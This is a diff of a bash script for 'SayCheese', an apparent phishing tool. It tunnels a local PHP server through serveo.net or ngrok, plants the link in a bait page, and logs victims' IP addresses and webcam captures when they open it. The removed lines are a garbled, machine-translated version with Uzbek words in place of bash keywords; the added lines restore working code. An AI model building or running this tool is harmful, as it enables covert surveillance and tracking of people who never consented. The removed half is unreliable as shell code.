@@ -1,242 +1,243 @@
-#! / bin / bash
+#!/bin/bash
 # SayCheese v1.0
-# kodlangan: github.com/thelinuxchoice/saycheese
-# Agar siz ushbu kodning biron bir qismidan foydalansangiz, menga kredit bering. Linzalarni o'qing!
+# coded by: github.com/thelinuxchoice/saycheese
+# If you use any part from this code, giving me the credits. Read the Lincense!
 
-tuzoq  ' printf "\ n"; to'xtatish ' 2
+trap 'printf "\n";stop' 2
 
-banner () {
+banner() {
 
 
-printf  " \ e [1; 92m ____ \ e [0m \ e [1; 77m ____ _ \ e [0m \ n "
-printf  " \ e [1; 92m / ___ | __ _ _ _ \ e [0m \ e [1; 77m / ___ | | __ ___ ___ ___ ___ \ e [0m \ n "
-printf  " \ e [1; 92m \ ___ \ / _ \` | | | \ e [0m \ e [1; 77m | | | '_ \ / _ \ / _ \ / __ | / _ \ \ e [0m \ n "
-printf  " \ e [1; 92m ___) | (_ | | | _ | | \ e [0m \ e [1; 77m | ___ | | | | __ / __ / \ __ \ __ / \ e [0m \ n "
-printf  " \ e [1; 92m | ____ / \ __, _ | \ __, | \ e [0m \ e [1; 77m \ ____ | _ | | _ | \ ___ | \ ___ || ___ / \ ___ | \ e [0m \ n "
-printf  " \ e [1; 92m | ___ / \ e [0m \ n "
+printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
+printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
+printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
+printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
+printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
+printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf  " \ e [1; 77m v1.0 tomonidan kodlangan github.com/thelinuxchoice/saycheese\e(0m \ n "
+printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
 
-printf  " \ n "
+printf "\n"
 
 
 }
 
-to'xtatish () {
+stop() {
 
-checkngrok = $ ( ps aux | grep -o " ngrok "  | head -n1 )
-checkphp = $ ( ps aux | grep -o " php "  | head -n1 )
-checkssh = $ ( ps aux | grep -o " ssh "  | head -n1 )
-agar [[ $ checkngrok  ==  * ' ngrok ' * ]] ;  keyin
-pkill -f -2 ngrok > / dev / null 2> & 1
-killall -2 ngrok > / dev / null 2> & 1
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
 fi
 
-agar [[ $ checkphp  ==  * ' php ' * ]] ;  keyin
-killall -2 php > / dev / null 2> & 1
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
 fi
-agar [[ $ checkssh  ==  * ' ssh ' * ]] ;  keyin
-killall -2 ssh > / dev / null 2> & 1
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
 fi
-chiqish 1
+exit 1
 
 }
 
-bog'liqliklar () {
+dependencies() {
 
 
-buyruq -v php > / dev / null 2> & 1  || { echo  > & 2  " Menga php kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
  
 
 
 }
 
-catch_ip () {
+catch_ip() {
 
-ip = $ ( grep -a ' IP: ' ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
-IFS = $ ' \ n '
-printf  " \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] IP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-mushuk ip.txt >> saved.ip.txt
+cat ip.txt >> saved.ip.txt
 
 
 }
 
-tekshiruv () {
+checkfound() {
 
-printf  " \ n "
-printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Kutish maqsadlari, \ e [0m \ e [1; 77m chiqish uchun Ctrl + C tugmalarini bosing ... \ e [0m \ n "
-while [ rost ] ;  qil
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
 
 
-agar [[ -e  " ip.txt " ]] ;  keyin
-printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] Maqsad havolani ochdi! \ n "
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
 fi
 
-uxlash 0,5
+sleep 0.5
 
-agar [[ -e  " Log.log " ]] ;  keyin
-printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] Cam fayli qabul qilindi! \ e [0m \ n "
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
-uxlash 0,5
+sleep 0.5
 
-amalga oshirildi 
+done 
 
 }
 
 
-server () {
+server() {
 
-buyruq -v ssh > / dev / null 2> & 1  || { echo  > & 2  " Menga ssh kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf  " \ e [1; 77m [\ e [0m \ e [1; 93m + \ e [0m \ e [1; 77m] Serveo-ni ishga tushirish ... \ e [0m \ n "
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
 
-agar [[ $ checkphp  ==  * ' php ' * ]] ;  keyin
-killall -2 php > / dev / null 2> & 1
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
 fi
 
-agar [[ $ subdomain_resp  ==  true ]] ;  keyin
+if [[ $subdomain_resp == true ]]; then
 
-$ ( which sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R ' $ subdomain ' : 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
 
-uxlash 8
-boshqa
-$ ( which sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 
-uxlash 8
+sleep 8
 fi
-printf  " \ e [1; 77m [\ e [0m \ e [1; 33m + \ e [0m \ e [1; 77m] PHP-server ishga tushirilmoqda ... (localhost: 3333) \ e [0m \ n "
-fuser -k 3333 / tcp > / dev / null 2> & 1
-php -S localhost: 3333 > / dev / null 2> & 1  &
-uxlash 3
-send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
-printf  ' \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] To'g'ridan-to'g'ri havola: \ e [0m \ e [1; 77m% s \ n '  $ send_link
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
 
 
-payload_ngrok () {
+payload_ngrok() {
 
-link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
-sed ' s + forwarding_link + ' $ link ' + g ' saycheese.html > index2.html
-sed ' s + forwarding_link + ' $ link ' + g ' template.php > index.php
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
 }
 
-ngrok_server () {
+ngrok_server() {
 
 
-agar [[ -e ngrok]] ;  keyin
-aks sado  " "
-boshqa
-buyruq -v unzip > / dev / null 2> & 1  || { echo  > & 2  " Men ochishni talab qilaman, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
-buyruq -v wget > / dev / null 2> & 1  || { echo  > & 2  " Menga wget kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
-printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Ngrok yuklab olinmoqda ... \ n "
-arch = $ ( uname -a | grep -o ' arm '  | head -n1 )
-arch2 = $ ( uname -a | grep -o ' Android ' | head -n1 ) 
-agar [[ $ arch  ==  * ' arm ' * ]] || [[ $ arch2  ==  * ' Android ' * ]] ;  keyin
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > / dev / null 2> & 1
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
-agar [[ -e ngrok-stable-linux-arm.zip]] ;  keyin
-nzrok-stable-linux-arm.zip > / dev / null 2> & 1 ni oching
-chmod + x ngrok
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
-boshqa
-printf  " \ e [1; 93m [!] Yuklab olishda xato ... Termux, ishga tushirish: \ e [0m \ e [1; 77m pkg install wget \ e [0m \ n "
-chiqish 1
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
 fi
 
-boshqa
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > / dev / null 2> & 1 
-agar [[ -e ngrok-stable-linux-386.zip]] ;  keyin
-ochish ngrok-stable-linux-386.zip > / dev / null 2> & 1
-chmod + x ngrok
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
-boshqa
-printf  " \ e [1; 93m [!] Yuklab olishda xatolik ... \ e [0m \ n "
-chiqish 1
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
 fi
 fi
 fi
 
-printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] PHP-server ishga tushirilmoqda ... \ n "
-php -S 127.0.0.1:3333 > / dev / null 2> & 1  & 
-uxlash 2
-printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] ngrok serverini ishga tushirish ... \ n "
-./ngrok http 3333 > / dev / null 2> & 1  &
-uxlash 10
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
 
-link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
-printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] To'g'ridan-to'g'ri havola: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ link
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
-tekshiruv
+checkfound
 }
 
-start1 () {
-agar [[ -e sendlink]] ;  keyin
+start1() {
+if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf  " \ n "
-printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Serveo.net \ e [0m \ n "
-printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Ngrok \ e [0m \ n "
-default_option_server = " 1 "
-o'qish -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m + \ e [0m \ e [1; 92m] Portni yo'naltirish parametrini tanlang: \ e [0m ' option_server
-option_server = " $ {option_server : - $ {default_option_server} } "
-agar [[ $ option_server  -eq 1]] ;  keyin
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server -eq 1 ]]; then
 
-buyruq -v php > / dev / null 2> & 1  || { echo  > & 2  " Menga ssh kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
-boshlang
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+start
 
-Alif [[ $ option_server  -eq 2]] ;  keyin
+elif [[ $option_server -eq 2 ]]; then
 ngrok_server
-boshqa
-printf  " \ e [1; 93m [!] yaroqsiz variant! \ e [0m \ n "
-uxlash 1
-aniq
-boshlash1
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
 fi
 
 }
 
 
-foydali yuk () {
+payload() {
 
-send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed ' s + forwarding_link + ' $ send_link ' + g ' saycheese.html > index2.html
-sed ' s + forwarding_link + ' $ send_link ' + g ' template.php > index.php
+sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
 }
 
-boshlash () {
+start() {
 
-default_choose_sub = " Y "
-default_subdomain = " saycheese $ RANDOM "
+default_choose_sub="Y"
+default_subdomain="saycheese$RANDOM"
 
-printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Subdomain tanlanadimi? (Standart: \ e [0m \ e [1; 77m [Y / n] \ e [0m \ e [1; 33m): \ e [0m '
-select_sub-ni o'qing
-select_sub = " $ {choose_sub : - $ {default_choose_sub} } "
-agar [[ $ select_sub  ==  " Y "  ||  $ select_sub  ==  " y "  ||  $ select_sub  ==  " Ha "  ||  $ select_sub  ==  " ha " ]] ;  keyin
-subdomain_resp = rost
-printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Subdomain: (Standart: \ e [0m \ e [1; 77m% s \ e [ 0m \ e [1; 33m): \ e [0m '  $ default_subdomain
-subdomainni o'qing
-subdomain = " $ {subdomain : - $ {default_subdomain} } "
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
 fi
 
 server
-foydali yuk
-tekshiruv
+payload
+checkfound
 
 }
 
 banner
-bog'liqliklar
-boshlash1
+dependencies
+start1
+.
